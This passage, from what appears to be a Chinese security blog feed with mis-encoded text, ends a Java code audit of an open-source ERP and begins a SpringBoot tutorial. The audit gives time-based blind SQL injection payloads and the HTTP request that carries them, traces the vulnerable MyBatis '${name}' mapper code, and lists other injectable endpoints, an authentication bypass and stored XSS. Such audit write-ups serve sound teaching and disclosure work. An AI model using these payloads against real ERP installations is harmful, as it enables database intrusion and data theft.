ä¸­çœ‹åˆ°çš„å‡ ä¸ªå‚æ•°â€œ<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>â€ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png"></p><p>å¯¹ name å‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼š</p><p>ä»ç»“æœæ¥çœ‹æ—¶é—´ç›²æ³¨æˆåŠŸäº†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br>Host: 169.254.252.28:8123<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://169.254.252.28:8123/pages/manage/account.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817<br>Connection: close<br><br>GET /account/list?search=&#123;&quot;name&quot;:&quot;123&#x27; or sleep(5)--+&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;&#125;&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br><br>payloadï¼š<br>GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png"></p><p>åœ¨Mybatisçš„æ—¥å¿—ä¸­ï¼Œ å¯ä»¥æ¸…æ¥šçœ‹åˆ° SQL æ³¨å…¥ç‚¹å·²ç»è¢«åˆ©ç”¨ï¼Œå¹¶ä¸” <strong>æ—¶é—´ç›²æ³¨ç”Ÿæ•ˆ</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png"></p><h3 id="DepotMapperEx-xml"><a href="#DepotMapperEx-xml" class="headerlink" title="DepotMapperEx.xml"></a>DepotMapperEx.xml</h3><p>é€šè¿‡ä¸Šè¿°AccoutMapperEx.xmlçš„å®¡è®¡ï¼Œå¯ä»¥ç¡®å®šè¯¥ç³»ç»Ÿä¸­æœ‰å¤šä¸ªç±»ä¼¼çš„sqlæ³¨å…¥ç‚¹ï¼Œä»–ä»¬çš„æµç¨‹éƒ½æ˜¯ä¸€è‡´çš„ã€‚</p><p>å†ä»¥DepotMapperEx.xml ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;select id=&quot;selectByConditionDepot&quot; parameterType=&quot;com.jsh.erp.datasource.entities.DepotExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;<br>  select dep.*,usr.username as principalName<br>  FROM jsh_depot dep<br>  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)<br>  where 1=1<br>  &lt;if test=&quot;name != null&quot;&gt;<br>    and dep.name like &#x27;%$&#123;name&#125;%&#x27;<br>  &lt;/if&gt;<br><br>-&gt;selectByConditionDepot<br>public interface DepotMapperEx &#123;<br><br>    List&lt;DepotEx&gt; selectByConditionDepot(<br>            @Param(&quot;name&quot;) String name,<br>            @Param(&quot;type&quot;) Integer type,<br>            @Param(&quot;remark&quot;) String remark,<br>            @Param(&quot;offset&quot;) Integer offset,<br>            @Param(&quot;rows&quot;) Integer rows);<br><br>-&gt;DepotService<br>public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception &#123;<br>        List&lt;DepotEx&gt; list=null;<br>        try&#123;<br>            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);<br>        &#125;catch(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        return list;<br>    &#125;<br><br>-&gt;select<br>@Override<br>    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception &#123;<br>        return getDepotList(map);<br>    &#125;<br><br>    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception &#123;<br>        String search = map.get(Constants.SEARCH);<br>        String name = StringUtil.getInfo(search, &quot;name&quot;);<br>        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &quot;type&quot;));<br>        String remark = StringUtil.getInfo(search, &quot;remark&quot;);<br>        String order = QueryUtils.order(map);<br>        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br><br>-&gt;select<br> /**<br>     * æŸ¥è¯¢<br>     * @param apiName<br>     * @param parameterMap<br>     * @return<br>     */<br>    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;<br>        if (StringUtil.isNotEmpty(apiName)) &#123;<br>            return container.getCommonQuery(apiName).select(parameterMap);<br>        &#125;<br>        return new ArrayList&lt;Object&gt;();<br>    &#125;<br><br>-&gt;select<br>@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)<br>    public String getList(@PathVariable(&quot;apiName&quot;) String apiName,<br>                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,<br>                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,<br>                        @RequestParam(value = Constants.SEARCH, required = false) String search,<br>                        HttpServletRequest request)throws Exception &#123;<br>        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>        parameterMap.put(Constants.SEARCH, search);<br>        PageQueryInfo queryInfo = new PageQueryInfo();<br>        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();<br>        if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;<br>            pageSize = 10;<br>        &#125;<br>        String offset = ParamUtils.getPageOffset(currentPage, pageSize);<br>        if (StringUtil.isNotEmpty(offset)) &#123;<br>            parameterMap.put(Constants.OFFSET, offset);<br>        &#125;<br>        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br>        objectMap.put(&quot;page&quot;, queryInfo);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png"></p><h3 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h3><p>é€šè¿‡å…¨å±€æœç´¢åˆ°<code>like &#39;%${name}%&#39;</code>ï¼Œå®šä½ <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>ï¼Œä¹‹åä¾¿åœ¨ <code>controller</code> å’Œ <code>service</code> ä¸­æ‰¾å¯¹åº”çš„æ–‡ä»¶åï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°  <code>selectByConditionXxxxx</code> (åŸºæœ¬ä¸Šéƒ½åœ¨serviceä¸­)ï¼Œæ‰¾åˆ°ä¹‹åä¼šå‘ç° <code>selectByConditionXxxxx</code> ä¸­æ‰€éœ€çš„å‡ ä¸ªå‚æ•°ï¼Œéƒ½æ˜¯æ¥è‡ª <code>select</code> æŸ¥è¯¢ï¼Œè·Ÿè¿› <code>select</code> ï¼Œæ‰¾åˆ° <code>getXxxList</code> æ–¹æ³•è§£æ <code>select(Map&lt;String,String&gt; map)</code> ä¼ å…¥çš„å‰ç«¯è¯·æ±‚å‚æ•°ï¼Œè·Ÿè¿› <code>select</code>ï¼Œå‘ç°ä»–æ˜¯ç»Ÿä¸€æ¥å£ï¼Œé€šè¿‡ <code>apiName</code> åŠ¨æ€è°ƒç”¨ä¸åŒæŸ¥è¯¢ã€‚æ¥ä¸‹æ¥å°±åœ¨å‰ç«¯æ‰¾å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œåœ¨â€åŸºæœ¬èµ„æ–™â€œé‡Œå¯ä»¥çœ‹åˆ°æœ‰æŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡æŠ“åŒ…æˆ–è€…å¯¹åº”åç§°æ¥ç¡®å®šéœ€è¦çš„æ¥å£ï¼Œä¾‹å¦‚ï¼š<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>ï¼Œ<code>nameã€serialNoã€remark</code> éƒ½æ˜¯å¯¹åº”çš„ <code>AccoutMapperEx</code> çš„å‚æ•°ï¼Œé‚£ä¹ˆå°±åœ¨ <code>name</code> å‚æ•°æ³¨å…¥ã€‚</p><p>åŒæ ·çš„æ¼æ´æœ‰ï¼š</p><ul><li>AccoutMapperEx.xml</li><li>DepotMapperEx.xml </li><li>LogMapperEx.xml ï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œæ—¥å¿—ç®¡ç†â€ï¼‰<ul><li>payload : 111â€™ OR SLEEP(5) OR â€˜1â€™&#x3D;â€™1</li></ul></li><li><font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xmlï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œå•†å“ç®¡ç†â€-â€œå•†å“ä¿¡æ¯â€ï¼‰</font></li><li><font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xmlï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œåŸºæœ¬èµ„æ–™â€-â€œç»æ‰‹äººç®¡ç†â€ï¼‰</font></li><li><font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xmlï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œè§’è‰²ç®¡ç†â€ï¼‰</font></li><li><font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xmlï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œå•†å“ç®¡ç†â€-â€œè®¡é‡å•ä½â€ï¼‰</font></li><li><font style="color:#080808;background-color:#ffffff;">UserMapperEx.xmlï¼ˆåŠŸèƒ½ç‚¹åœ¨â€œç³»ç»Ÿç®¡ç†â€-â€œç”¨æˆ·ç®¡ç†â€ï¼‰</font></li></ul><h2 id="4ã€èº«ä»½éªŒè¯-é‰´æƒ"><a href="#4ã€èº«ä»½éªŒè¯-é‰´æƒ" class="headerlink" title="4ã€èº«ä»½éªŒè¯&amp;é‰´æƒ"></a>4ã€èº«ä»½éªŒè¯&amp;é‰´æƒ</h2><p>è¿™ä¸€éƒ¨åˆ†ä¾æ—§æ˜¯ LogCostFilter.java å‘ç°çš„æ¼æ´ç‚¹ï¼Œåœ¨SQL æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬ç™»å½•åˆ°åå°è¿›è¡Œçš„æ³¨å…¥ï¼Œé‚£ä¹ˆç»“åˆé‰´æƒæ¼æ´ï¼Œå°±å¯ä»¥æœªç™»å½•è¿›è¡ŒSQLæ³¨å…¥ã€‚</p><p>ä»å›¾ç‰‡çœ‹åˆ°ï¼Œç»•è¿‡èº«ä»½éªŒè¯ä¹Ÿå¯ä»¥è¿›è¡ŒSQLæ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png"></p><h1 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h1><h2 id="1ã€å­˜å‚¨å‹XSS"><a href="#1ã€å­˜å‚¨å‹XSS" class="headerlink" title="1ã€å­˜å‚¨å‹XSS"></a>1ã€<font style="color:rgb(31, 45, 61);">å­˜å‚¨å‹XSS</font></h2><p>å¾ˆå¤šåŠŸèƒ½ç‚¹éƒ½å­˜åœ¨æ­¤æ¼æ´ï¼Œä»¥ä¸‹ä¸¾ä¸‰ä¾‹ï¼š</p><h3 id="1-1-ç”¨æˆ·ç®¡ç†"><a href="#1-1-ç”¨æˆ·ç®¡ç†" class="headerlink" title="1.1 ç”¨æˆ·ç®¡ç†"></a>1.1 ç”¨æˆ·ç®¡ç†</h3><p>å…ˆæ–°å¢ä¸€ä¸ªç”¨æˆ·</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png"></p><p>ä¿®æ”¹ç”¨æˆ·å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png"></p><p>å‡ºç°å¼¹çª—</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png"></p><p>æ‰¾åˆ°æºç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png"></p><p>æ¥æ”¶å‰ç«¯ä¼ å…¥çš„ info å‚æ•°ï¼Œæ£€æŸ¥ç”¨æˆ·æ•°é‡æ˜¯å¦è¶…é™ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼Œè¿™é‡Œå°±æ˜¯XSS çš„å…¥å£ç‚¹</p><h3 id="1-2-å•†å“ä¿¡æ¯"><a href="#1-2-å•†å“ä¿¡æ¯" class="headerlink" title="1.2 å•†å“ä¿¡æ¯"></a>1.2 å•†å“ä¿¡æ¯</h3><p>å¢åŠ å•†å“ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png"></p><p>äº”ä¸ªåœ°æ–¹éƒ½ä¼šå¼¹çª—</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png"></p><h3 id="1-3-æ”¶å…¥å•"><a href="#1-3-æ”¶å…¥å•" class="headerlink" title="1.3 æ”¶å…¥å•"></a>1.3 æ”¶å…¥å•</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png"></p><h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p><font style="color:rgb(34, 34, 38);">é€šè¿‡dnslogæ¢æµ‹fastjsonçš„å‡ ç§æ–¹æ³•ï¼ˆ</font>java.net.Inet4Addressã€Inet6Addressã€InetSocketAddressï¼Œurlï¼‰</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945 mybatisäºŒçº§ç¼“å­˜ååºåˆ—åŒ–çš„åˆ†æä¸å¤ç°</font></p><p><a href="https://www.freebuf.com/vuls/251862.html">https://www.freebuf.com/vuls/251862.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">MyBatisè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2020-26945</font></p><p><a href="https://www.freebuf.com/articles/web/252542.html">https://www.freebuf.com/articles/web/252542.html</a></p><p><font style="color:rgba(0, 0, 0, 0.85);">Java ä»£ç å®¡è®¡ä¹‹åå¤ ERP CMS v2.3</font></p><p><a href="https://www.freebuf.com/articles/web/347135.html"><font style="color:rgb(65, 131, 196);">https://www.freebuf.com/articles/web/347135.html</font></a></p><p>ã€Javaä»£ç å®¡è®¡ã€‘åå¤-ERPv2.3</p><p><a href="https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html"><font style="color:rgb(65, 131, 196);">https://lusensec.github.io/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/index.html</font></a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot</title>
    <link href="/2025/08/14/SpringBoot/"/>
    <url>/2025/08/14/SpringBoot/</url>
    
    <content type="html"><![CDATA[<h1 id="1ã€SpringBoot-ç®€ä»‹"><a href="#1ã€SpringBoot-ç®€ä»‹" class="headerlink" title="1ã€SpringBoot ç®€ä»‹"></a>1ã€SpringBoot ç®€ä»‹</h1><h2 id="1-1-ä»€ä¹ˆæ˜¯-SpringBoot"><a href="#1-1-ä»€ä¹ˆæ˜¯-SpringBoot" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯ SpringBoot"></a>1.1 ä»€ä¹ˆæ˜¯ SpringBoot</h2><p><font style="color:rgba(0, 0, 0, 0.9);">éšç€ Spring ä¸æ–­çš„å‘å±•ï¼Œæ¶‰åŠçš„é¢†åŸŸè¶Šæ¥è¶Šå¤šï¼Œé¡¹ç›®æ•´åˆå¼€å‘éœ€è¦é…åˆå„ç§å„æ ·çš„æ–‡ä»¶ï¼Œæ…¢æ…¢å˜å¾—ä¸é‚£ä¹ˆæ˜“ç”¨ç®€å•ï¼Œè¿èƒŒäº†æœ€åˆçš„ç†å¿µï¼Œç”šè‡³äººç§°é…ç½®åœ°ç‹±ã€‚Spring Boot æ­£æ˜¯åœ¨è¿™æ ·çš„ä¸€ä¸ªèƒŒæ™¯ä¸‹è¢«æŠ½è±¡å‡ºæ¥çš„å¼€å‘æ¡†æ¶ï¼Œç›®çš„ä¸ºäº†è®©å¤§å®¶æ›´å®¹æ˜“çš„ä½¿ç”¨ Spring ã€æ›´å®¹æ˜“çš„é›†æˆå„ç§å¸¸ç”¨çš„ä¸­é—´ä»¶ã€å¼€æºè½¯ä»¶ï¼›</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot åŸºäº Spring å¼€å‘ï¼ŒSpirng Boot æœ¬èº«å¹¶ä¸æä¾› Spring æ¡†æ¶çš„æ ¸å¿ƒç‰¹æ€§ä»¥åŠæ‰©å±•åŠŸèƒ½ï¼Œåªæ˜¯ç”¨äºå¿«é€Ÿã€æ•æ·åœ°å¼€å‘æ–°ä¸€ä»£åŸºäº Spring æ¡†æ¶çš„åº”ç”¨ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¹¶ä¸æ˜¯ç”¨æ¥æ›¿ä»£ Spring çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œæ˜¯å’Œ Spring æ¡†æ¶ç´§å¯†ç»“åˆç”¨äºæå‡ Spring å¼€å‘è€…ä½“éªŒçš„å·¥å…·ã€‚Spring Boot ä»¥</font><strong><font style="color:rgba(0, 0, 0, 0.9);">çº¦å®šå¤§äºé…ç½®çš„æ ¸å¿ƒæ€æƒ³</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œé»˜è®¤å¸®æˆ‘ä»¬è¿›è¡Œäº†å¾ˆå¤šè®¾ç½®ï¼Œå¤šæ•° Spring Boot åº”ç”¨åªéœ€è¦å¾ˆå°‘çš„ Spring é…ç½®ã€‚åŒæ—¶å®ƒé›†æˆäº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼ˆä¾‹å¦‚ Redisã€MongoDBã€Jpaã€RabbitMQã€Quartz ç­‰ç­‰ï¼‰ï¼ŒSpring Boot åº”ç”¨ä¸­è¿™äº›ç¬¬ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®çš„å¼€ç®±å³ç”¨ã€‚</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">ç®€å•æ¥è¯´å°±æ˜¯SpringBootå…¶å®ä¸æ˜¯ä»€ä¹ˆæ–°çš„æ¡†æ¶ï¼Œå®ƒé»˜è®¤é…ç½®äº†å¾ˆå¤šæ¡†æ¶çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±åƒmavenæ•´åˆäº†æ‰€æœ‰çš„jaråŒ…ï¼Œspring bootæ•´åˆäº†æ‰€æœ‰çš„æ¡†æ¶ ã€‚</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Bootçš„ä¸»è¦ä¼˜ç‚¹ï¼š</font></strong></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">ä¸ºæ‰€æœ‰Springå¼€å‘è€…æ›´å¿«çš„å…¥é—¨</font></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">å¼€ç®±å³ç”¨</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œæä¾›å„ç§é»˜è®¤é…ç½®æ¥ç®€åŒ–é¡¹ç›®é…ç½®</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">å†…åµŒå¼å®¹å™¨ç®€åŒ–Webé¡¹ç›®</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">æ²¡æœ‰å†—ä½™ä»£ç ç”Ÿæˆå’ŒXMLé…ç½®çš„è¦æ±‚</font></li></ul><h2 id="1-2-å•ä½“åº”ç”¨æ¶æ„"><a href="#1-2-å•ä½“åº”ç”¨æ¶æ„" class="headerlink" title="1.2 å•ä½“åº”ç”¨æ¶æ„"></a>1.2 å•ä½“åº”ç”¨æ¶æ„</h2><p>æ‰€è°“å•ä½“åº”ç”¨æ¶æ„ï¼ˆall in oneï¼‰æ˜¯æŒ‡ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªåº”ç”¨çš„ä¸­çš„æ‰€æœ‰åº”ç”¨æœåŠ¡éƒ½å°è£…åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ã€‚</p><p>æ— è®ºæ˜¯ERPã€CRMæˆ–æ˜¯å…¶ä»–ä»€ä¹ˆç³»ç»Ÿï¼Œä½ éƒ½æŠŠæ•°æ®åº“è®¿é—®ï¼ŒWebè®¿é—®ï¼Œç­‰ç­‰å„ä¸ªåŠŸèƒ½æ”¾åˆ°ä¸€ä¸ªwaråŒ…å†…ã€‚</p><p>è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œæ˜“äºå¼€å‘å’Œæµ‹è¯•ï¼›ä¹Ÿååˆ†æ–¹ä¾¿éƒ¨ç½²ï¼›å½“éœ€è¦æ‰©å±•æ—¶ï¼Œåªéœ€è¦å°†warå¤åˆ¶å¤šä»½ï¼Œç„¶åæ”¾åˆ°å¤šä¸ªæœåŠ¡å™¨ä¸Šï¼Œå†åšä¸ªè´Ÿè½½å‡è¡¡å°±å¯ä»¥ã€‚</p><p>å•ä½“åº”ç”¨æ¶æ„çš„ç¼ºç‚¹æ˜¯ï¼Œå“ªæ€•æˆ‘è¦ä¿®æ”¹ä¸€ä¸ªéå¸¸å°çš„åœ°æ–¹ï¼Œæˆ‘éƒ½éœ€è¦åœæ‰æ•´ä¸ªæœåŠ¡ï¼Œé‡æ–°æ‰“åŒ…ã€éƒ¨ç½²è¿™ä¸ªåº”ç”¨waråŒ…ã€‚ç‰¹åˆ«æ˜¯å¯¹äºä¸€ä¸ªå¤§å‹åº”ç”¨ï¼Œæˆ‘ä»¬ä¸å¯èƒ½æŠŠæ‰€æœ‰å†…å®¹éƒ½æ”¾åœ¨ä¸€ä¸ªåº”ç”¨é‡Œé¢ï¼Œæˆ‘ä»¬å¦‚ä½•ç»´æŠ¤ã€å¦‚ä½•åˆ†å·¥åˆä½œéƒ½æ˜¯é—®é¢˜ã€‚</p><h2 id="1-3-å¾®æœåŠ¡æ¶æ„"><a href="#1-3-å¾®æœåŠ¡æ¶æ„" class="headerlink" title="1.3 å¾®æœåŠ¡æ¶æ„"></a><font style="color:rgba(0, 0, 0, 0.9);">1.3 å¾®æœåŠ¡æ¶æ„</font></h2><p><a href="https://www.ruanyifeng.com/blog/2022/04/microservice.html">å¾®æœåŠ¡æ˜¯ä»€ä¹ˆï¼Ÿ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—</a></p><p><font style="color:rgba(0, 0, 0, 0.9);">all in one çš„æ¶æ„æ–¹å¼ï¼Œæˆ‘ä»¬æŠŠæ‰€æœ‰çš„åŠŸèƒ½å•å…ƒæ”¾åœ¨ä¸€ä¸ªåº”ç”¨é‡Œé¢ã€‚ç„¶åæˆ‘ä»¬æŠŠæ•´ä¸ªåº”ç”¨éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚å¦‚æœè´Ÿè½½èƒ½åŠ›ä¸è¡Œï¼Œæˆ‘ä»¬å°†æ•´ä¸ªåº”ç”¨è¿›è¡Œæ°´å¹³å¤åˆ¶ï¼Œè¿›è¡Œæ‰©å±•ï¼Œç„¶ååœ¨è´Ÿè½½å‡è¡¡ã€‚</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">æ‰€è°“å¾®æœåŠ¡æ¶æ„ï¼Œå°±æ˜¯æ‰“ç ´ä¹‹å‰ all in one çš„æ¶æ„æ–¹å¼ï¼ŒæŠŠæ¯ä¸ªåŠŸèƒ½å…ƒç´ ç‹¬ç«‹å‡ºæ¥ã€‚æŠŠç‹¬ç«‹å‡ºæ¥çš„åŠŸèƒ½å…ƒç´ çš„åŠ¨æ€ç»„åˆï¼Œéœ€è¦çš„åŠŸèƒ½å…ƒç´ æ‰å»æ‹¿æ¥ç»„åˆï¼Œéœ€è¦å¤šä¸€äº›æ—¶å¯ä»¥æ•´åˆå¤šä¸ªåŠŸèƒ½å…ƒç´ ã€‚æ‰€ä»¥å¾®æœåŠ¡æ¶æ„æ˜¯å¯¹åŠŸèƒ½å…ƒç´ è¿›è¡Œå¤åˆ¶ï¼Œè€Œæ²¡æœ‰å¯¹æ•´ä¸ªåº”ç”¨è¿›è¡Œå¤åˆ¶ã€‚</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼š</font></p><ol><li><font style="color:rgba(0, 0, 0, 0.9);">èŠ‚çœäº†è°ƒç”¨èµ„æºã€‚</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">æ¯ä¸ªåŠŸèƒ½å…ƒç´ çš„æœåŠ¡éƒ½æ˜¯ä¸€ä¸ªå¯æ›¿æ¢çš„ã€å¯ç‹¬ç«‹å‡çº§çš„è½¯ä»¶ä»£ç ã€‚</font></li></ol><h2 id="1-4-Helloï¼ŒWorld-ç¬¬ä¸€ä¸ª-SpringBoot-ç¨‹åº"><a href="#1-4-Helloï¼ŒWorld-ç¬¬ä¸€ä¸ª-SpringBoot-ç¨‹åº" class="headerlink" title="1.4 Helloï¼ŒWorld - ç¬¬ä¸€ä¸ª SpringBoot ç¨‹åº"></a><font style="color:rgba(0, 0, 0, 0.9);">1.4</font> Helloï¼ŒWorld - 